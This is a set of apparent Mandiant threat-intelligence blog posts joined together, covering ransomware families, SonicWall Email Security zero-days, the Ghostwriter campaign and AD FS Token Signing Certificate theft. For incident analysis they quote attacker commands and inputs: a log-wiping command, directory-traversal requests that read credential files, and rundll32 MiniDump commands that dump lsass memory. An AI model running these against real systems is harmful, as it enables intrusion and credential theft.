Other variations of the filenames were observed such as ntuser and wapsvc. SOMBRAT Technical Details The SOMBRAT backdoor is written in modern C++ and implemented as a collection of \"plugins\" that interoperate with one another. There are five plugins distributed with this variant: `core`, `network`, `storage`, `taskman`, and `debug` (the `config` plugin described by Blackberry is not present). The core plugins communicate with the C2 server via messages sent over a common networking layer; each plugin supports its own set of messages, and the backdoor protocol can be extended by dynamically loaded plugins. The `core` plugin coordinates state tracking, such as network connectivity, and dynamic plugin loading and unloading. The `network` plugin configures the networking layer used to communicate with the C2 server, for example enabling the operator to switch between DNS and TCP protocols. The `storage` plugin exposes logical operations, such as read and write, for an encrypted file used to store plugins, resources, and arbitrary data. The `taskman` plugin enables the operator to list and kill processes on the compromised system. Finally, the `debuglog` plugin supports a single command to records debug messages. Given that the core plugins do not enable an operator directly execute arbitrary commands or reconfigure the system, the primary function of the SOMBRAT backdoor is to load plugins provided via the C2 server. These plugins may be shellcode or DLL modules to be dynamically loaded. The C2 server may instruct the backdoor to load the plugins directly or persist them into the encrypted storage file, where they may subsequently be reloaded, such as after upgrading the backdoor. Figure 2: Malware author mark “No one is perfect except me.” SOMBRAT evades forensic analysis by patching the process memory used to record command line arguments. It replaces the initial command line with the base filename of the program executable, removing any arguments. This means that investigators that inspect a process listing via memory forensics will see the innocuous-looking command line `powershell.exe` rather than references to the uncommon filename such as `WwanSvc.c`. SOMBRAT Network Communications The SOMBRAT backdoor can communicate with its C2 server using both DNS and a proxy-aware, TLS-encrypted stream protocol. By default, the backdoor uses the DNS protocol; however, this can be reconfigured by the C2 server. Mandiant observed the domains feticost[.]com and celomito[.]com used for DNS C2 communications. When the backdoor communicates via its DNS protocol, it constructs and resolves FQDNs, interpreting the DNS results to extract C2 messages. The authoritative DNS server embeds data within the IP address field of DNS A record results and within the Name Administrator field of DNS TEXT record results. By making many requests to unique subdomains of the C2 domain, the backdoor can slowly transmit information a few bytes at a time. Ransomware Similarities Beginning in October 2020, Mandiant observed samples of a customized version of DEATHRANSOM. This newly modified version removed the language check feature (Figure 3 shows the language check of DEATHRANSOM). Figure 3: Language check from Fortinet blog HELLOKITTY ransomware—used to target Polish video game developer CD Projekt Red—is reportedly built from DEATHRANSOM. HELLOKITTY is named after a mutex named ‘HELLOKITTYMutex,’ used when the malware executable is launched (see Figure 4). Figure 4: HELLOKITTY mutex shown in Process Explorer CEMIG (Companhia Energética de Minas Gerais), a Brazilian electric power company, revealed on Facebook in late December 2020 that it was a victim of HELLOKITTY cyber attack . In January 2021, Mandiant observed a new ransomware deployed against a victim and assigned the name FIVEHANDS. Analysis of FIVEHANDS revealed high similarity to DEATHRANSOM, sharing several features, functions, and coding similarities. Absent in FIVEHANDS is a language check, similar to HELLOKITTY Both DEATHRANSOM and FIVEHANDS drops a ransom note in all non-excluded directories Technical Comparison of FIVEHANDS, HELLOKITTY and DEATHRANSOM DEATHRANSOM is written in C while the other two families are written in C++. DEATHRANSOM uses a distinct series of do/while loops to enumerate through network resources, logical drives, and directories. It also uses QueueUserWorkItem to implement thread pooling for its file encryption threads. HELLOKITTY is written in C++, but reimplements a significant portion of DEATHRANSOM's functionality using similar loop operations and thread pooling via QueueUserWorkItem. The code structure to enumerate network resources, logical drives, and perform file encryption is very similar. Additionally, HELLOKITTY and DEATHRANSOM share very similar functions to check for the completion status of their encryption threads before exiting. FIVEHANDS is written in C++ and although high level functionality is similar, the function calls and code structure to implement the majority of the functionality is written differently. Also, instead of executing threads using QueueUserWorkItem, FIVEHANDS uses IoCompletionPorts to more efficiently manage its encryption threads. FIVEHANDS also uses more functionality from the C++ standard template library (STL) than does HELLOKITTY. Deletion of Volume Shadow Copies DEATHRANSOM, HELLOKITTY, and FIVEHANDS use the same code to delete volume shadow copies via WMI by performing the query select * from Win32_ShadowCopy and then deleting each instance returned by its id. Encryption Operations Each of these three malware families utilizes a similar encryption scheme. An asymmetric public key is either hard-coded or generated. A unique symmetric key is generated for each encrypted file. After each file is encrypted, the asymmetric key will encrypt the symmetric key and append it to the encrypted file. Additionally, a unique four byte magic value is appended to the end of the encrypted file. The malware checks for these magic bytes to ensure it does not encrypt a previously encrypted file again. DEATHRANSOM and HELLOKITTY implement the file encryption operations using a very similar code structure and flow. FIVEHANDS implements its file encryption with a differing code structure and uses different embedded encryption libraries. In addition to the symmetric key, HELLOKITTY and FIVEHANDS also encrypts file metadata with the public key and appends this to the encrypted file. DEATHRANSOM generates an RSA key pair while HELLOKITTY and FIVEHANDS use an embedded RSA or NTRU public key. DEATHRANSOM Encryption DEATHRANSOM creates an RSA-2048 public and private key pair. Using an Elliptic-curve Diffie–Hellman (ECDH) routine implemented with Curve25519, it computes a shared secret using two input values: 1) 32 random bytes from a RtlGenRandom call and 2) a hardcoded 32 byte value (attacker's public key). It also create a Curve25519 public key. The shared secret is SHA256 hashed and used as the key to Salsa20 encrypt the RSA public and private keys. The RSA public key is used to encrypt the individual symmetric keys that are used to encrypt each file. A Base64 encoded version of the encrypted RSA keys and the victim’s Curve25519 public key is included in the ransom note, providing the threat actors the information needed to decrypt the victim's files. For the symmetric key, DEATHRANSOM calls RtlGenRandom to generate 32 random bytes. This is the 32 byte key used to AES encrypt each file. After the file is encrypted, the AES key is encrypted with the public RSA key and appended to the file. DEATHRANSOM lastly appends the four magic bytes of AB CD EF AB at the end of the encrypted file and uses this as a check to ensure that it does not encrypt an already encrypted file. The analyzed DEATHRANSOM sample used for comparison does not change the file extension. HELLOKITTY Encryption HELLOKITTY contains an embedded RSA-2048 public key. This public key is SHA256 hashed and used as the victim ID within the ransom note. This RSA pubic key is also used to encrypt each file's symmetric key. For the symmetric key, HelloKitty generates a 32 byte seed value based on the CPU timestamp. A Salsa20 key is generated and encrypts a second 32 byte seed value. The encrypted result is XOR’d with the first seed, resulting in a 32 byte key used to AES encrypt each file. After each file is encrypted, the original file size, magic value of DE C0 AD BA, and AES key are encrypted with the public RSA key and appended to the file. HELLOKITTY and FIVEHANDS appends this additional metadata to the encrypted file, while DEATHRANSOM does not. Lastly it appends the four magic bytes DA DC CC AB to the end of the encrypted file. Depending on the version, HELLOKITTY may or may not change the file extension. Other samples of HELLOKITTY have used an embedded NTRU public key instead of RSA. FIVEHANDS Encryption FIVEHANDS uses an embedded NTRU public key. This NTRU key is SHA512 hashed and the first 32 bytes are used as the victim ID within the ransom note. This NTRU pubic key is also used to encrypt each file's symmetric key. For the symmetric key, FIVEHANDS uses an embedded generation routine to produce 16 random bytes used for an AES key to encrypt each file. After each file is encrypted, the original file size, magic value of DE C0 AD BA, and AES key are encrypted with the public NTRU key and appended to the file. The four magic bytes DB DC CC AB are appended to the end of the encrypted file. FIVEHANDS includes additional code not found in DEATHRANSOM and HELLOKITTY to use the Windows Restart Manager to close a file currently in use so that it can be unlocked and successfully encrypted. The encrypted file extension is changed to .crypt  extension FIVEHANDS's encryption flow and sequence is very different from the other two, partially because it incorporates asynchronous I/O requests and uses different embedded encryption libraries. FIVEHANDS Encrypted Dropper One significant change between DEATHRANSOM and FIVEHANDS is the use of a memory-only dropper, which upon execution, expects a command line switch of -key followed by the key value necessary to perform decryption of its payload. The payload is stored and encrypted with AES-128 using an IV of “85471kayecaxaubv”. The decrypted FIVEHANDS payload is immediately executed after decryption. To date, Mandiant has only observed encrypted droppers with a common imphash of 8517cf209c905e801241690648f36a97. CLI arguments FIVEHANDS can receive a CLI argument for a path, this limits the ransomware's file encryption activities to the specified directory. DEATHRANSOM and HELLOKITTY do not accept CLI arguments. Locale and Mutex checks DEATHRANSOM performs language ID and keyboard layout checks. If either of these match Russian, Kazakh, Belarusian, Ukrainian or Tatar it exits. Neither HELLOKITTY or FIVEHANDS perform language ID or keyboard checks. HELLOKITTY performs a mutex check while the other two do not perform mutex checks. File Exclusions DEATHRANSOM and HELLOKITTY both exclude the same directories and files: programdata, $recycle.bin, program files, windows, all users, appdata, read_me.txt, autoexec.bat, desktop.ini, autorun.inf, ntuser.dat, iconcache.db, bootsect.bak, boot.ini, ntuser.dat.log, or thumbs.db. The exclusions for FIVEHANDS are more extensive and contain additional files and directories to ignore. Additional Differences DEATHRANSOM makes an external HTTPS connection to download a file. Neither HELLOKITTY or FIVEHANDS initiate network connections. HELLOKITTY contains code to set the victims wallpaper to a ransom related image. The other samples do not have this functionality Different versions of DEATHRANSOM and HELLOKITTY are known to change the file extension Different versions of HELLOKITTY are known to check for specific processes to terminate.

While similarities between HELLOKITTY and FIVEHANDS are notable, ransomware may be used by different groups through underground affiliate programs. Mandiant will assign an uncategorized cluster based on multiple factors including infrastructure used during intrusions and as such, not all SOMBRAT or FIVEHANDS ransomware intrusions may have been conducted by UNC2447. WARPRISM and FOXGRABBER have been used in SUNCRYPT and DARKSIDE ransomware demonstrating additional complexity and sharing between different ransomware affiliate programs.

Overview Figure 1: SonicWall Email Security ecosystem overview (via SonicWall ) SonicWall Email Security (ES) is an email security solution that “ provides comprehensive inbound and outbound protection, and defends against advanced email-borne threats such as ransomware, zero-day threats, spear phishing and business email compromise (BEC) .” The solution can be deployed as a physical appliance, virtual appliance, software installation, or a hosted SaaS solution. Figure 2: Sample SonicWall Email Security login page Like many appliances, the solution provides a rich, web-accessible administrative interface that serves as the main avenue for product configuration. Depending on the customer’s deployment method, this software is potentially capable of running under Windows or Unix because it heavily leverages OS-independent Apache Tomcat and Java. While the solution doesn’t require that this interface be exposed to the internet, internet-wide scanning shows approximately 700 publicly reachable interfaces. Investigation In March 2021, Mandiant Managed Defense identified post-exploitation web shell activity on an internet-accessible system within a customer’s environment. Managed Defense isolated the system and collected evidence to determine how the system was compromised. The system was quickly identified as a SonicWall Email Security (ES) application running on a standard Windows Server 2012 installation. The adversary-installed web shell was being served through the HTTPS-enabled Apache Tomcat web server bundled with SonicWall ES. Due to the web shell being served in the application’s bundled web server, we immediately suspected the compromise was associated with the SonicWall ES application itself. When we contacted the customer, we learned that the installation of SonicWall ES was the latest version available for download (10.0.9) and that there was no publicly available information pertaining to vulnerabilities or in-the-wild exploitation. To determine if a potential application-level vulnerability was exploited to install the web shell, Mandiant collected endpoint telemetry data. We soon identified post-exploitation activity aimed at destroying evidence on the system, executed in the context of the web shell. The adversary executed the following command, shortly after installing the web shell: cmd.exe /c \"echo \"\" > \"C:/Program Files (x86)/SonicWallES/logs/webUI/webui.json Figure 3: The Adversary clearing existing entries in the current “webui.json” log This command deleted the most recent application-level log entries recorded by the SonicWall ES web application. While clearing log files is a standard anti-forensics technique, understanding the location of internal log files generated by applications is usually overlooked by most spray-and-pray attackers. This added fuel to our suspicion that we were dealing with an adversary who had intimate knowledge of how the SonicWall ES application worked. Fortunately for us, additional log files and a previously created virtual server snapshot provided enough evidence to track down the vulnerabilities and the adversary’s activities on the host. Vulnerabilities CVE-2021-20021 Unauthenticated administrative access through improperly secured API endpoint The SonicWall Email Security application contains an authenticated control panel to provide administration capabilities. One feature available allows application administrators to authorize an additional administrator account from a separate Microsoft Active Directory Organization Unit (AD OU). https://<SonicWall ES host>/createou?data=<XML HERE> Figure 4: A redacted example of the vulnerable endpoint associated with arbitrary user creation Requests to this form, however, were not verified to require previous authentication to the appliance. Due to this vulnerability, an adversary with a well-crafted XML document could either GET or POST their document to the application and create a “role.ouadmin” account (Figure 4). This account could then be used to authenticate to the application as an administrator. CVE-2021-20022 Arbitrary file upload through post-authenticated “branding” feature Like many enterprise products with a web-based user interface, SonicWall Email Security includes a feature known as \"branding\" which gives administrators the ability to customize and add certain assets to the interface, such as company logos. These branding assets are managed via packages, and new packages can be created by uploading ZIP archives containing custom text, image files, and layout settings. A lack of file validation can enable an adversary to upload arbitrary files, including executable code, such as web shells. Once uploaded, these branding package ZIP archives are normally expanded and saved to the <SonicWall ES install path>\\data\\branding directory. However, an adversary could place malicious files in arbitrary locations, such as a web accessible Apache Tomcat directory, by crafting a ZIP archive containing a file within a sequence of directory traversal notations such as in Figure 5. Figure 5: Example ZIP archive containing a Zip Slip web shell It is important to note that the lack of validation which enables Zip Slip attacks is not unique to SonicWall Email Security. As detailed in Snyk's research on the topic , they exist within the many code libraries from which applications have been built. CVE-2021-20023 Directory-traversal leads to arbitrary file read in post-authenticated \"branding\" feature Mandiant confirmed another post-authentication vulnerability in the administrative panel’s built-in \"branding\" feature which allowed an adversary to retrieve arbitrary files from the host by sending crafted HTTP GET requests to a particular resource. Figure 6 demonstrates the formatting of such request. https://<SonicWall ES host>/dload_apps?action=<any value>&path=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fcalc.exe&id=update Figure 6: An example web request which results in downloading the Windows calculator While the working directory of this branding feature is <SonicWall ES install path>\\data\\updates , a directory-traversal vulnerability allows an adversary to access files located outside of this directory. As the Apache Tomcat webserver handling this request is operating as the NT AUTHORITY\\SYSTEM account, any file on the operating system can be accessed. Combinations of all three exploits were leveraged interchangeably by the adversary to perform the following actions: Creation of a new Administrator account on the SonicWall ES device Exposure of the hashed passwords for existing, locally configured Administrative accounts The creation of a web shell in an arbitrary directory Real-time debugging of exploitation success and failure Post-Exploitation Upon obtaining administrative access to the appliance through CVE-2021-20021, an adversary sent crafted HTTP requests to the resource /dload_apps , a component of the application's \"branding\" feature, exploiting CVE-2021-20023. These requests leveraged directory traversal attacks, enabling access to two sensitive XML configuration files located at <SonicWall ES install path>\\data\\multi_accounts.xml and <SonicWall ES install path>\\data\\multi_ldap.xml , respectively (Figure 7). GET /dload_apps?action=REDACTED&path=..%2Fmulti_accounts.xml&id=update GET /dload_apps?action=REDACTED&path=..%2Fmulti_ldap.xml&id=update Figure 7: HTTP GET requests exploiting CVE-2021-20023 These files contained details about existing accounts as well as Active Directory credentials used by the application. Next, the adversary uploaded a ZIP archive containing the BEHINDER JSP web shell from the administrative panel's \"branding\" page. The crafted ZIP archive used a Zip Slip attack to exploit CVE-2021-20022, which caused the web shell to be written to the web-accessible Apache Tomcat directory <SonicWall ES install path>\\Apache Software Foundation\\Tomcat 9.0\\webapps\\SearchEngineRMIService\\ . BEHINDER is a publicly available, multi-platform web shell that accepts encrypted command and control (C2) communications. In principle, BEHINDER operates similarly to CHINA CHOPPER , a popular web shell that has been previously detailed by FireEye. Like CHINA CHOPPER, an adversary operates a client-side application to pass commands to the web shell within the body of HTTP requests. As the core functionality of the backdoor is contained within the client-side application, BEHINDER—much like CHINA CHOPPER—has the added benefit of being small, with the variant observed in this investigation weighing in at less than 1 kilobyte (Figure 8). Figure 8: The BEHINDER web shell observed by Mandiant, which executes AES encrypted and base64 encoded commands With the addition of a web shell to the server, the adversary had unrestricted access to the command prompt, with the inherited permissions of the NT AUTHORITY\\SYSTEM account. After clearing the SonicWall application “ webui.json ” log file, the adversary escalated their attack to credential harvesting in preparation of moving laterally into the victim's network. The adversary relied on “living off the land” techniques rather than bringing their own tools into the environment, which often has the benefit of potentially avoiding detections from a security product. We observed the adversary executing the reg save command to dump the HKLM\\SAM , HKLM\\SYSTEM , and HKLM\\SECURITY registry hives, which contain vital information in recovering password hashes and LSA secrets. Additionally, the adversary obtained in-memory sensitive credentials through the use of built-in memory dumping techniques. The adversary was observed invoking the MiniDump export of the Windows DLL comsvcs.dll to dump both the process memory for lsass.exe and the running instance of Apache Tomcat as seen in Figure 9. rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass PID> c:\\windows\\temp\\TS_LAS.dmp full rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump <Tomcat PID> C:\\windows\\temp\\TS_FF9DG.dmp full Figure 9: The adversary acquiring process memory for lsass.exe (MITRE ATT&CK T1003.001) and Apache Tomcat Mandiant typically observes adversaries employing short and easy-to-type filenames during their operations, simply for efficiency. As such, the aforementioned filenames initially stood out as being peculiar, as a mix of case and symbols would require more effort to type than is often necessary. While this could always be indicative of a tool being used, the slight variations between the two commands—the absence of a comma before the DLL export and the uppercase C:\\ drive in the second—suggest that they were manually typed. Considering that the C:\\Windows\\Temp\\ directory on a Windows host also normally contains numerous similarly named temporary files, the adversary was likely taking extra care to evade suspicion should the activity reach the screen of a security analyst. Continuing their effort to live off the land as much as possible, the adversary located a copy of the archiving utility 7-Zip already present on the host and used it to compress a subdirectory of <SonicWall ES install path>\\data\\archive\\ . This directory contains daily archives of emails processed by SonicWall ES—again demonstrating the adversary’s familiarity with the application. After a several-day lull in activity, the adversary returned to the host, presumably after working to recover passwords from the registry hives and process memory that was dumped earlier. At the time of activity, the victim organization was using the same local Administrator password across multiple hosts in their domain, which provided the adversary an easy opportunity to move laterally under the context of this account—highlighting the value of randomizing passwords to built-in Windows accounts on each host within a domain. We observed the adversary leveraging Impacket’s publicly available WMIEXEC.PY tool to access several internal hosts, which enabled remote command execution over Microsoft's DCOM protocol via Windows Management Instrumentation (WMI). The adversary managed to briefly perform internal reconnaissance activity prior to being isolated and removed from the environment. Attribution Mandiant currently tracks this activity as UNC2682. Ultimately, Mandiant prevented UNC2682 from completing their mission so their objectives of the attack currently remain unknown. Each investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations that Mandiant responds to. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. For more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors . Investigation & Monitoring Tips Mandiant recommends monitoring of the following endpoint telemetry indicators for potential evidence of compromise: Child processes of the web server process “tomcat” on SonicWall Email Security appliances, particularly cmd.exe The creation or existence of web shells on a server hosting SonicWall Email Security In addition to standard indicators, Mandiant recommends reviewing SonicWall-related internal configuration files and logs for evidence of previous adversary activity. Evidence of malicious web requests and their values may be identifiable in the following log files: The Apache Tomcat logs: C:\\Program Files\\SonicWallES\\Apache Software Foundation\\Tomcat 9.0\\logs The SonicWall application logs: C:\\Program Files\\SonicWallES\\logs\\webUI\\webui.json Evidence of unauthorized modifications to SonicWall configuration settings can be confirmed in the following files: The administration user account file: C:\\Program Files\\SonicWallES\\data\\multi_accounts.xml Additional user account files that may have been created in the following directories: C:\\Program Files\\SonicWallES\\data\\perhost C:\\Program Files\\SonicWallES\\data\\perldap C:\\Program Files\\SonicWallES\\data\\perou Branding related zip files in any of the subdirectories of the following directory: C:\\Program Files\\SonicWallES\\data\\branding Detecting the Techniques FireEye detects this activity across our platforms.

                "text": "In July 2020, Mandiant Threat Intelligence released a public report detailing an ongoing influence campaign we named “Ghostwriter.” Ghostwriter is a cyber-enabled influence campaign which primarily targets audiences in Lithuania, Latvia and Poland and promotes narratives critical of the North Atlantic Treaty Organization’s (NATO) presence in Eastern Europe. Since releasing our public report, we have continued to investigate and report on Ghostwriter activity to Mandiant Intelligence customers. We tracked new incidents as they happened and identified activity extending back years before we formally identified the campaign in 2020. A new report by our Information Operations analysis, Cyber Espionage analysis, and Mandiant Research teams provides an update on Ghostwriter , highlighting two significant developments. We have observed an expansion of narratives, targeting and TTPs associated with Ghostwriter activity since we released our July 2020 report. For example, several recent operations have heavily leveraged the compromised social media accounts of Polish officials on the political right to publish content seemingly intended to create domestic political disruption in Poland rather than foment distrust of NATO. These operations, conducted in Polish and English, appear to have largely not relied on the dissemination vectors we have typically observed with previous Ghostwriter activity, such as website compromises, spoofed emails or posts from inauthentic personas. We have observed no evidence that these social media platforms were themselves in any way compromised, and instead believe account credentials were obtained using the compromised email accounts of targeted individuals. Recently obtained technical evidence now allows us to assess with high confidence that UNC1151, a suspected state-sponsored cyber espionage actor that engages in credential harvesting and malware campaigns, conducts at least some components of Ghostwriter influence activity; current intelligence gaps, including gaps pertaining to website compromises and the operation of false personas, do not allow us to conclusively attribute all aspects of the Ghostwriter campaign to UNC1151 at this time. We do not associate UNC1151 with any other previously tracked threat groups. Since the start of 2021, UNC1151 has expanded its credential theft activity to target German politicians. This targeting has been publicly reported in the German Tagesschau . The appendices of the report include an exhaustive table of incidents and operations we currently associate with Ghostwriter activity, a detailed case study of a recent Ghostwriter operation, and indicators of compromise (IOCs) related to UNC1151.

                "text": "Organizations are increasingly adopting cloud-based services such as Microsoft 365 to host applications and data. Sophisticated threat actors are catching on and Mandiant has observed an increased focus on long-term persistent access to Microsoft 365 as one of their primary objectives. The focus on developing novel and hard to detect methods to achieve this goal was highlighted with the recent detection of UNC2452 and their access to Microsoft 365 . One of this group's key TTPs was to steal the Token Signing Certificate from an organization’s AD FS server to enable them to bypass MFA and access cloud services as any user, at any time. While defenders previously associated the defense of this certificate, and thus the entire ecosystem, with careful access control and detection efforts around the AD FS server and service account, this is no longer sufficient. In this blog post we will show how a threat actor, with the right privilege, can extract the encrypted Token Signing Certificate from anywhere on the internal network. Once extracted, a threat actor can easily decrypt it and begin accessing cloud services. Active Directory Federation Services Active Directory Federation Services (AD FS) is a feature for Windows Servers that enables federated identity and access management . It is often used by organizations to provide single sign-on functionality to access enterprise applications such as Microsoft 365. In technical terms, AD FS functions as an Identity Provider (IdP) and Microsoft 365 is a Service Provider (SP). We’ll use Microsoft 365 as an example going forward, but this technique could apply to any service that is set up to trust AD FS. AD FS verifies a user’s identity and issues assertions that describe the user. Microsoft 365  trusts AD FS to verify user identities and provide it with assertions. To Microsoft 365, it doesn’t matter how AD FS performed the verification, it just needs the assertions. In the typical deployment (Figure 1), AD FS will verify a user’s identity using Active Directory. At a minimum, an AD FS deployment consists of two servers in an enterprise’s on-premises network: the primary AD FS server, and an AD FS Web Application Proxy (WAP). The proxy is placed in the DMZ and has no functionality besides proxying sign-on attempts from the Internet to the AD FS server. The primary AD FS server receives proxied requests, verifies a user’s identity, and issues assertions that are packaged into SAML security tokens for the user. Figure 1: Typical AD FS deployment (source: Microsoft ) The SAML token issued by AD FS proves a user’s identity to Microsoft 365 and can also be used to make authorization decisions. The SAML token is an XML document with two main components: Assertions : Assertions are XML elements that describe the user’s identity. An assertion could be a user SID, group membership SIDs, or other elements like the user’s department name. A single SAML token can have multiple assertions attached to it. Digital Signature : The assertions in the SAML token are digitally signed using a public/private keypair that resides on the AD FS server. This is called the Token Signing Certificate. The Token Signing Certificate is the bedrock of security in AD FS. Microsoft 365 uses the digital signature to validate that the SAML token is authentic, valid, and comes from an AD FS server that it trusts. To enable this verification, an administrator shares the public component of the Token Signing Certificate with Microsoft 365. This is then used to cryptographically verify the digital signature in the SAML token and prove authenticity as well as integrity of the token. In other words, if a threat actor got hold of a Token Signing Certificate, they could generate arbitrary SAML tokens to access any federated application, as any user, and even bypass MFA. Golden SAML Golden SAML was coined in 2017 by CyberArk to describe the technique of forging SAML tokens to access SPs given a valid Token Signing Certificate. At TROOPERS 19 , I detailed how a threat actor could extract the Token Signing Certificate from an AD FS server, as well as some mitigation strategies for defenders. In a default AD FS configuration, the Token Signing Certificate is stored within a Windows Internal Database (WID) instance that is running on the AD FS server. WID is more or less MS SQL Express, except the database can only be accessed locally over a special named pipe connection. In AD FS, the database is further locked down to only the AD FS service account. The Token Signing Certificate is stored in an encrypted state in the IdentityServerPolicy.ServiceStateSummary table. Figure 2 contains a single row with a column that stores all the settings that AD FS will need on service start as an XML document. <SigningToken> <IsChainIncluded>false</IsChainIncluded> <IsChainIncludedSpecified>false</IsChainIncludedSpecified> <FindValue>99FABAEE46A09CD9B34B9510AB10E2B0C0ACB99B</FindValue> <RawCertificate></RawCertificate> <EncryptedPfx></EncryptedPfx> <StoreNameValue>My</StoreNameValue> <StoreLocationValue>CurrentUser</StoreLocationValue> <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> </SigningToken> Figure 2: Example Token Signing Certificate stored in the AD FS database The Token Signing Certificate as it is stored in the AD FS database is encrypted using symmetric key encryption. Windows uses a technology called Distributed Key Management (DKM) to store the secret value used to derive the symmetric key in an Active Directory container. The AD FS service account can read the attributes of this container, derive the symmetric key, and then decrypt the Token Signing Certificate. AD FS Replication AD FS also supports a farm configuration for high availability and load balancing in larger enterprise networks. The individual AD FS servers in a farm can be configured to use unique Token Signing Certificates; however, the default is to have the servers share the same Token Signing Certificate.  In order to stay in sync with each other, the farm will have a primary node and secondary nodes. The secondary nodes make use of a replication service to acquire configuration settings and certificates from the primary AD FS server. To facilitate this, AD FS makes use of Windows Communication Foundation (WCF). WCF is a framework that allows developers to build service-oriented applications . A WCF application has two components: the service that will receive and process messages, and the client that sends messages to a service and receives back responses. The AD FS servers run a WCF service that is called the Policy Store Transfer Service internally. To send a message to this service, the client will connect to the URL http://<adfs server name>:80/adfs/services/policystoretransfer . Note that even though the channel is over HTTP, the actual data being exchanged is encrypted during transit. It is also key to understand that although there is a single primary AD FS server, all nodes in an AD FS farm run this WCF service and can be used for replication. Upon receipt of a message, the WCF service enforces an authorization check to ensure the calling identity is permitted to receive the requested information. The permission check is done by evaluating an authorization policy that is also stored in the IdentityServerPolicy.ServiceStateSummary table of the AD FS database. The policy permits identities whose primary SID matches the AD FS Service account or to any identity that is member of the AD FS server’s local administrators group. If the identity of the client passes the authorization check, then the WCF service will send back a message containing the requested information. <AuthorizationPolicy> @RuleName = “Permit Service Account”exists([Type == “http://schemas.microsoft.com/ws/2008/06/identity/claims/ primarysid”, Value == “S-1-5-21-3508695881-2242692613 -376241919-1107”]) => issue(Type = “http://schemas .microsoft.com/authorization/claims/permit”, Value = “ true”); @RuleName = “Permit Local Administrators”exists([Type == “http://schemas.microsoft.com/ws/2008/06/identity/claims/group sid”, Value == “S-1-5-32-544”])=> issue(Type = &quot ;http://schemas.microsoft.com/authorization/claims/permit”, Value = “true”); </AuthorizationPolicy> Figure 3: Default Authorization Policy for AD FS server Room for Abuse A threat actor can abuse the Policy Store Transfer Service to acquire the encrypted Token Signing Certificate over the network, similar to the DCSync technique for Active Directory. It is important to note that the data is still encrypted and requires the DKM key stored in Active Directory to decrypt. This technique, however, requires a significant change to how defenders have secured AD FS servers and monitored them for theft of the Token Signing Certificate. First, previous techniques required code execution on an AD FS server to extract the data or at least an SMB connection to transfer the backing database files. With a strong defense in depth program using secure credential management, EDR, and network segmentation, an enterprise can make it very difficult for a threat actor to access an AD FS server and the Token Signing Certificate. Abusing the AD FS Replication service, however, requires only access to the AD FS server over the standard HTTP port. The default installation of AD FS will even create a Windows Firewall rule to allow HTTP traffic from any system. Additionally, a threat actor does not need the credentials for the AD FS service account and can instead use any account that is a local administrator on an AD FS server. Lastly, there is no Event Log message that is recorded when a replication event occurs on an AD FS server. Altogether, this makes the technique both much easier to execute and much harder to detect. The authorization policy itself also presents an opportunity for abuse. Because the authorization policy is stored as XML text in the configuration database, a threat actor with enough access could modify it to be more permissive. A threat actor could modify the Authorization Policy to include a group SID such as domain users, S-1-5-21-X-513 . Similarly, they could add an ACE to the DKM key container in Active Directory. This would allow the threat actor to easily obtain the Token Signing Certificate and decrypt it using any domain user credentials. This would give them persistent ability to perform a Golden SAML attack with only access to the network as a requirement. Mandiant has not yet observed this technique used in the wild; however, it is trivial to write a POC for and we are aware of one public tool that will soon support it. Figure 4 shows the output of POC code written in .NET to extract the Token Signing Certificate from a remote AD FS server. Figure 4: POC code output Mitigations The best mitigation against this technique is to use the Windows Firewall to restrict access to port 80 TCP to only the AD FS servers in the farm. If an organization has only a single AD FS server, then port 80 TCP can be blocked completely. This block can be put in place because all traffic to and from AD FS servers and proxies for user authentication is over port 443 TCP. To limit inbound communications, modify the existing firewall rule that AD FS inserts on installation. Set-NetFirewallRule -DisplayName \"AD FS HTTP Services (TCP-In)\" -RemoteAddress <ADFS1 IP address>,<ADFS2 IP Address> If no rule exists, the scriptlet in Figure 5 should be applied to all ADFS servers to create one. New-NetFirewallRule -DisplayName \"Allow ADFS Servers TCP 80\" -Direction Inbound -Action Allow  -Protocol TCP -LocalPort 80 -RemoteAddress <ADFS1 IPAddress >,<ADFS2 IPAddress> Figure 5: Windows Firewall - Allow ADFS Server - TCP 80 Organizations that are monitoring the internal network can alert on HTTP POST requests to the address that hosts the Policy Store Transfer service. If there is an AD FS farm, then the IP addresses of the AD FS servers will need to be whitelisted against the rule. Figure 6 shows a sample Snort rule to detect this activity. alert tcp any any -> any 80 (msg:\"AD FS Replication\"; flow:established, to_server; content:\"POST\"; http_method; content:\"adfs/services/policystoretransfer\"; http_uri; threshold:type limit,track by_src,count 1,seconds 3600; priority:3; sid:7000000; rev:1;) Figure 6: Sample snort rule Acknowledgements Mandiant would like to acknowledge the great work of Dr. Nestori Syynimaa (@DrAzureAD). Dr. Syynimaa independently thought to research the replication of configuration information between AD FS servers and has published his findings on his blog . Mandiant would also like to thank Microsoft for their collaboration on mitigations and detections for this technique. Lastly, special thanks to Mike Burns of the Mandiant Security Transformation services team for his feedback on mitigations and detections.

                "text": "High-profile security incidents in the past decade have brought increased scrutiny to cyber security for operational technology (OT). However, there is a continued perception across critical infrastructure organizations that OT networks are isolated from public networks—such as the Internet. In Mandiant’s experience, the concept of an ‘air gap’ separating OT assets from external networks rarely holds true in practice. In 2018, we released a blog post presenting the tools and techniques that TEMP.Veles used during the TRITON incident to traverse from an external compromise of the information technology (IT) network of a critical infrastructure organization to the safety systems located deep in the OT network. We regularly reproduce this approach in our OT-focused red team engagements to expose similar attack paths across client infrastructure and to identify environment specific opportunities to prevent and detect network propagation techniques across intermediary systems. In this blog post, we share another case study from one of our OT Red Team engagements to illustrate the tactics, techniques, and procedures (TTPs) that can be leveraged by sophisticated threat actors to breach the protected perimeter between an IT network and an OT network. We also examine some of the different types of critical information often found in IT networks that an attacker can leverage during later stages of the Targeted Attack Lifecycle. The goal of this engagement was to access an endpoint meter control infrastructure for a state-wide smart grid environment from the Internet and turn it off. To hear our experts relay more on this and other OT Red Team lessons learned, join our FireEye Mandiant Virtual Summit session . Visit our website to learn more about Mandiant’s OT security practice or contact us directly to request Mandiant services or threat intelligence . Building the Foundation: Information Gathering for IT-OT Network 